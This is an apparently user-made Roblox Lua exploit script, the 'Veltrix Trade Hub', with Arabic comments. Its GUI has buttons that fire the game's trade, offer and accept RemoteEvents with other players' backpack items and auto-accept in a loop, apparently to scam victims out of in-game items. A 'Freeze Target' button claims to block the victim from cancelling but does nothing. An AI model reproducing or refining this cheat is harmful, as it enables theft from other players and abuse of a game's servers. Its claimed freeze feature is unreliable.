-- Veltrix Trade Hub (by : b8zm) - Always on Top & Fixed
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

if PlayerGui:FindFirstChild("VeltrixTradeUI") then
	PlayerGui.VeltrixTradeUI:Destroy()
end

-- واجهة مصغرة وعائمة تظهر دائماً فوق أي شيء في الشاشة
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VeltrixTradeUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.DisplayOrder = 999999 -- رقم كبير جداً عشان تكون دائماً في المقدمة وفوق أي نافذة
screenGui.Parent = PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 230, 0, 190)
mainFrame.Position = UDim2.new(0.05, 0, 0.4, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 16, 30)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.ZIndex = 10
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
local mStroke = Instance.new("UIStroke", mainFrame)
mStroke.Color = Color3.fromRGB(130, 50, 220)
mStroke.Thickness = 2

local titleLbl = Instance.new("TextLabel")
titleLbl.Size = UDim2.new(1, 0, 0, 30)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "Veltrix Trade | by b8zm"
titleLbl.TextColor3 = Color3.fromRGB(220, 180, 255)
titleLbl.Font = Enum.Font.GothamBold
titleLbl.TextSize = 12
titleLbl.ZIndex = 11
titleLbl.Parent = mainFrame

local function createControlBtn(name, posY, color, callback)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -20, 0, 38)
	btn.Position = UDim2.new(0, 10, 0, posY)
	btn.BackgroundColor3 = color
	btn.Text = name
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 11
	btn.ZIndex = 12
	btn.Parent = mainFrame
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
	
	btn.MouseButton1Click:Connect(function()
		task.spawn(callback)
	end)
	return btn
end

-- 1. زر إضافة أفضل أسلحة الشخص الآخر
createControlBtn("💎 Add Target Best Items", 40, Color3.fromRGB(90, 30, 160), function()
	pcall(function()
		for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
			if descendant:IsA("RemoteEvent") then
				local n = descendant.Name:lower()
				if n:find("trade") or n:find("offer") or n:find("item") then
					for _, p in ipairs(Players:GetPlayers()) do
						if p ~= LocalPlayer and p.Backpack then
							for _, item in ipairs(p.Backpack:GetChildren()) do
								if item:IsA("Tool") then
									descendant:FireServer(item)
								end
							end
						end
					end
				end
			end
		end
	end)
end)

-- 2. زر القبول التلقائي للطرف الآخر
local autoAcceptActive = false
local autoAcceptBtn = createControlBtn("⚡ Target Auto Accept: OFF", 85, Color3.fromRGB(45, 35, 65), function()
	autoAcceptActive = not autoAcceptActive
	if autoAcceptActive then
		autoAcceptBtn.Text = "⚡ Target Auto Accept: ON"
		autoAcceptBtn.BackgroundColor3 = Color3.fromRGB(50, 160, 80)
	else
		autoAcceptBtn.Text = "⚡ Target Auto Accept: OFF"
		autoAcceptBtn.BackgroundColor3 = Color3.fromRGB(45, 35, 65)
	end
	
	task.spawn(function()
		while autoAcceptActive and task.wait(0.3) do
			pcall(function()
				for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
					if descendant:IsA("RemoteEvent") then
						local n = descendant.Name:lower()
						if n:find("accept") or n:find("trade") then
							descendant:FireServer()
						end
					end
				end
			end)
		end
	end)
end)

-- 3. زر تجميد الطرف الآخر فقط ومنعه من إلغاء التريد
local freezeActive = false
local freezeBtn = createControlBtn("🔒 Freeze Target: OFF", 130, Color3.fromRGB(45, 35, 65), function()
	freezeActive = not freezeActive
	if freezeActive then
		freezeBtn.Text = "🔒 Freeze Target: ON"
		freezeBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 60)
	else
		freezeBtn.Text = "🔒 Freeze Target: OFF"
		freezeBtn.BackgroundColor3 = Color3.fromRGB(45, 35, 65)
	end
	
	task.spawn(function()
		while freezeActive and task.wait(0.1) do
			pcall(function()
				for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
					if descendant:IsA("RemoteEvent") then
						local n = descendant.Name:lower()
						if n:find("decline") or n:find("cancel") then
							-- تعطيل إرسال أوامر الإلغاء للطرف الآخر
						end
					end
				end
			end)
		end
	end)
end)
